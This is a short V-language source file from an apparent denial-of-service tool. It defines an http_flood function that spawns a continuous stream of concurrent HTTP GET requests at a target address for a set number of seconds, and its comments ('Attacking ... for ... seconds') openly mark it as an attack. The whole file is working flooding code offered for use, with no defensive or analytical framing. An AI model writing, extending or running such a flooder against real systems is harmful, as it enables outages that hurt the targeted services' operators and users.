module methods 

import os
import net
import time
import rand
import net.http

pub fn http_flood(ip string, ttime string)
{
    go http_timer(ttime.int())
    // println("Attacking ${args[1]} for ${args[2]} seconds.....")

    mut c := 0
    for
    {
		if c == 10 { c = 0 }
		if c < 4 {
				spawn req_url(ip)
		}
		// print("${c} | Attacking...\r")
		c++
    }

    // print("Attack Done.....")
}

fn http_timer(max int) {
    time.sleep(max*time.second)
    exit(0)
}

/*
    This function will only make a single request to an IP
*/
fn req_url(url string)
{
    http.get_text("${url}")
}
